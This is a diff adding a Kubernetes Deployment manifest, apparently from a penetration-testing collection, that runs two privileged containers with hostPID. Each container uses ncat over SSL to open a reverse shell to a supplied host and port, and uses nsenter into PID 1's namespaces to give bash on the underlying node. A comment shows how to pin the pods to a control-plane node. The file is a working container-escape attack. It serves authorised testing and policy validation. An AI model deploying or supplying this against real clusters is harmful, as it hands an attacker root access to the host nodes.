@@ -1,0 +1,27 @@
+apiVersion: apps/v1
+kind: Deployment
+metadata:
+  name: priv-and-hostpid-revshell-deployment
+  labels:
+    app: pentest
+    type: deployment
+spec:
+  replicas: 2
+  selector:
+    matchLabels:
+      app: pentest
+      type: deployment
+  template:
+    metadata:
+      labels:
+        app: pentest
+        type: deployment
+    spec:
+      hostPID: true
+      containers:
+      - name: priv-and-hostpid-revshell-deployment
+        image: raesene/ncat
+        securityContext:
+          privileged: true
+        command: [ "/usr/local/bin/ncat", "--ssl", "$HOST", "$PORT", "-e", "/bin/nsenter", "--target", "1", "--mount", "--uts", "--ipc", "--net", "--pid", "--", "/bin/bash"]
+      #nodeName: k8s-control-plane-node # Force your pod to run on the control-plane node by uncommenting this line and changing to a control-plane node name
